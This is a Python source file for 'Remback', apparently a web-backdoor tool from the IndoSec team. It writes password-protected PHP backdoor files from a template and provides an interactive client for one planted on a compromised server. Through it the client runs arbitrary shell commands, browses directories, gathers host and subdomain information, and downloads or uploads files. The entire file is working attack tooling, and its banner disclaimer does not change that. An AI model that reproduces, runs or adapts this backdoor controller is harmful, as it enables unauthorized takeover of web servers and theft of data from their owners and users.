# -*- coding: utf-8 -*-

from colorama import init, Fore, Back, Style
from prettytable import PrettyTable
from requests import post
from time import sleep
import readline
import json
import sys
import os
import re

init(autoreset=True) #autoreset colorama

reload(sys)
sys.setdefaultencoding('utf8')

class MyCompleter(object):  # Custom completer

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  # on first trigger, build possible matches
            if text:  # cache matches (entries that start with entered text)
                self.matches = [s for s in self.options 
                                    if s and s.startswith(text)]
            else:  # no text entered, all matches possible
                self.matches = self.options[:]

        # return match indexed by state
        try: 
            return self.matches[state]
        except IndexError:
            return None

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
     
def banner():
    print("""
         \033[91m`:+syhhys+:`          \033[92m ______ _______ _______  _____  _______ _______
       \033[91m-yNMMMMMMMMMMMh:        \033[92m|_____/ |______ |  |  | |     |    |    |______
      \033[91m/MMMMMMMMMMMMMMMM+       \033[92m|    \_ |______ |  |  | |_____|    |    |______
      \033[91mNhMMMMMMMMMMMMMMyN`      \033[97m                                        \t\tBeta V.0.1
      \033[91mm+NMMMMMMMMMMMMM/N       \033[92m______  _______ _______ _     _ ______   _____   _____   ______
      \033[91m:omy+/:+MM+:/+yN+/       \033[92m|_____] |_____| |       |____/  |     \ |     | |     | |_____/
  \033[91m:-   -M-  `/NN/`  :M.   --   \033[92m|_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_\033[0m
 \033[91m.mN.  :NNysmM++NmssNN-  .Nm.  \033[92m---------------------------------------------------------------
\033[91m.yyhyys///+yMd+odMh+///syhhyy. \033[97mAuthor : Rizsyad AR ft Fauzan W                     \033[0m
 \033[91m`  `.-+s-o/syyyys/s:s+:.`  `  \033[97mTeam   : { IndoSec }                                \033[0m
          \033[91ms-      :y           \033[97mWe not responsible for damage caused by Remback.    \033[0m
  \033[91m`/:-/ohy+mhyssyhm+sho/-:/`   \033[97mAttacking targets without mutual consent is illegal!\033[0m
   \033[91m+mNy+-` ./osso/. `-+yNm+   
    \033[91ms/                  +s\033[0m 
    """)

def help():
    print( Fore.WHITE + "\n[" + Fore.RED + "+" + Fore.WHITE + "] " + Fore.WHITE + "Command: ")

    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "info\t\t\t: information gathering")
    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "show\t\t\t: show dir and folder User-Friendly")
    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "subdo\t\t\t: get information subdomain target")
    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "download <file>\t\t: download file ")
    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "upload <path/file>\t\t: download file ")
    print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.WHITE + "cd <dir>\t\t\t: change directory ")


def fiturcd(cmd, getdir):
    getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
    newdir1 = ""

    if getcmd:
        if getcmd.group(1) == "..":
            for i in getdir.split('/')[:-1]:
                newdir1 += i + "/"

            result = newdir1

            return result

        else:
            for i in getdir.split('/'):
                newdir1 += i + "/" 
            
            result = newdir1 + getcmd.group(1)

            return result
    else:
        return False
        
def fiturdownload(cmd, getdir):
    getfile = re.match(r'download (.*)', cmd, re.M|re.I)
    
    if getfile:
        result = getdir + "/" + getfile.group(1)
        return result
    else:
        return False

def fiturupload(cmd, getdir):
    getfile = re.match(r'upload (.*)', cmd, re.M|re.I)
    
    if getfile:
        result = getfile.group(1)
        return result
    else:
        return False

    
def connect():
    url = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Input Backdoor Location: ")
    password = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Input Backdoor Password: ")

    try:
        check = post(url, data={"password":password}).text.replace('\n','')
    except KeyboardInterrupt:
        print( Fore.WHITE + "\n\n[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "CTRL+C Detected.....")
        raise SystemExit
    except:
        print(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Check your URL!")
        exit(0)

    if check == "true":
    
        getdir = post(url, data={"password":password,"cmd":"pwd"}).text.replace('\n','')

        sleep(2)
        print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Is Live.. Waiting to Connect BackDoor..")
        sleep(2)
        print(Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Backdoor Is Connected..\n")

        command = Fore.LIGHTCYAN_EX + "┌[remback" + Fore.LIGHTYELLOW_EX + "@" + Fore.LIGHTRED_EX + "IndoSec]~[" + Fore.LIGHTGREEN_EX + getdir + Fore.LIGHTRED_EX + "]\n" + Fore.LIGHTCYAN_EX + "└" + Fore.LIGHTYELLOW_EX + "#" + Fore.WHITE + " "
        result = ""
        
        while True:
                completer = MyCompleter(["upload", "command", "download", "show", "info", "clear", "subdo", "exit"])
                readline.set_completer(completer.complete)
                readline.parse_and_bind('tab: complete')

                cmd = raw_input(command).rstrip()

                if cmd == "exit":
                    break
                elif cmd == "clear":
                    cls()
                    banner()  
                elif cmd == "info":
                    result = post(url, data={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                    print(result)
                elif cmd == "subdo":
                    result = post(url, data={"password":password,"dir":getdir,"aksi":"show_subdo","cmd":""}).text
                    print("\n" + result)
                elif cmd == "show":
                    result = PrettyTable()

                    result.field_names = ["Name", "Size", "Last Modified", "Owner/Group", "Permission"]

                    result.align['Name'] = 'l'

                    data = {
                        "password":password,
                        "dir":getdir,
                        "aksi":"show_dirfile",
                        "cmd":""
                    }

                    r = post(url, data=data).text

                    output = json.loads(r)

                    for folder in output['folder']:
                        if folder['status'] == 'green':
                            result.add_row([folder['nama_folder'] + "/",folder['size'],folder['Last_Modified'],folder['og'], Fore.GREEN + folder['Permission'] + Style.RESET_ALL + Fore.WHITE])
                        else:
                            result.add_row([folder['nama_folder'] + "/",folder['size'],folder['Last_Modified'],folder['og'], Fore.RED + folder['Permission'] + Style.RESET_ALL + Fore.WHITE])

                    for files in output['file']:
                        if folder['status'] == 'green':
                            result.add_row([files['nama_file'],files['size'],files['Last_Modified'],files['og'], Fore.GREEN + files['Permission'] + Style.RESET_ALL + Fore.WHITE])
                        else:
                            result.add_row([files['nama_file'],files['size'],files['Last_Modified'],files['og'], Fore.RED + files['Permission'] + Style.RESET_ALL + Fore.WHITE])

                    
                    print(result)
                            
                elif cmd == "command":
                    help()


                if(fiturcd(cmd, getdir) != False):
                    output = fiturcd(cmd, getdir)
                    getdir = post(url, data={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text
                    command = Fore.LIGHTCYAN_EX + "┌[remback" + Fore.LIGHTYELLOW_EX + "@" + Fore.LIGHTRED_EX + "IndoSec]~[" + Fore.LIGHTGREEN_EX + getdir + Fore.LIGHTRED_EX + "]\n" + Fore.LIGHTCYAN_EX + "└" + Fore.LIGHTYELLOW_EX + "#" + Fore.WHITE + " "

                elif(fiturdownload(cmd, getdir) != False):
                    getname = re.match(r'download (.*)', cmd, re.M|re.I)
                    output = fiturdownload(cmd, getdir)
                    savein = raw_input("[?] Save File in: ")
                    data = {
                        "password":password,
                        "dir":getdir,
                        "cmd":"",
                        "aksi":"download",
                        "file":output
                    }
                    download = post(url, data=data)  
                    if download.text != "False":
                        open(savein + "/" + getname.group(1), 'wb').write(download.content)
                        result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Download File.."              
                    else:
                        result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Download file!"
                                 
                elif(fiturupload(cmd, getdir) != False):
                    getname = re.match(r'upload (.*)', cmd, re.M|re.I)
                    filename = getname.group(1).split('/')[-1]
                    try:
                        files = open(getname.group(1),"rb")
                        data = {
                            "password":password,
                            "dir":getdir,
                            "cmd":"",
                            "aksi":"upload",
                            "name":filename
                        }
                        upload = post(url, data=data, files={"file":files}).text

                        if(upload != "error"):
                            result = Fore.WHITE + "[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Success, Upload File.."
                        else:
                            result = Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Upload file!"
                            
                    except:
                        print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Error, Can't open file!")
                    
                else:
                    result = post(url, data={"password":password,"dir":getdir,"cmd":cmd}).text

                print("\033[92m"+result + "\033[0m\n")
    
    else:
        print( Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "] " + Fore.WHITE + "Password is Incorrect")
        exit(0)


def generate():
    backdoor_name   = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Name: ")
    password        = raw_input(Fore.WHITE + "[" + Fore.YELLOW + "?" + Fore.WHITE + "] " + Fore.WHITE + "Password: ")
    opensample      = open('sample/backdoor.txt', 'r')
    replacePassword = opensample.read().replace('12345', password)
    opensample.close()
    openbackdoor    = open(backdoor_name + '.php', 'w')
    openbackdoor.write(replacePassword)
    openbackdoor.close()

    print( Fore.WHITE + "\n[" + Fore.GREEN + "✔" + Fore.WHITE + "] " + Fore.WHITE + "Generating backdoor successfully")
    print( Fore.WHITE + "└[" + Fore.RED + "•" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Name\t:" + backdoor_name)
    print( Fore.WHITE + "└[" + Fore.RED + "•" + Fore.WHITE + "] " + Fore.WHITE + "Backdoor Password\t:" + password)
    
try:
    cls()
    banner()
    if sys.platform == "win32":
        print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Sorry, this tool does not work on Windows operating systems")
    else:
        print( Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "] Options :")
        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "1. " + Fore.WHITE + "Generate Backdoor")
        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "2. " + Fore.WHITE + "Remote Backdoor")
        print( Fore.WHITE + "└[" + Fore.GREEN + "•" + Fore.WHITE + "] " + Fore.RED + "3. " + Fore.WHITE + "Bypass Shell Exec (Coming Soon)")
        action = raw_input(Fore.LIGHTCYAN_EX + "\n┌[remback" + Fore.LIGHTYELLOW_EX + "@" + Fore.LIGHTRED_EX + "IndoSec]~[" + Fore.LIGHTGREEN_EX + "Choose the options" + Fore.LIGHTRED_EX + "]\n" + Fore.LIGHTCYAN_EX + "└" + Fore.LIGHTYELLOW_EX + "#" + Fore.WHITE + " ")
        if action == "1":
            cls()
            banner()
            generate()
        elif action == "2":
            cls()
            banner()
            connect()
        elif action == "3":
             print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Coming Soon")
        else:
            print( Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "Incorrect options")
except KeyboardInterrupt:
    print( Fore.WHITE + "\n\n[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.WHITE + "CTRL+C Detected.....")
    raise SystemExit

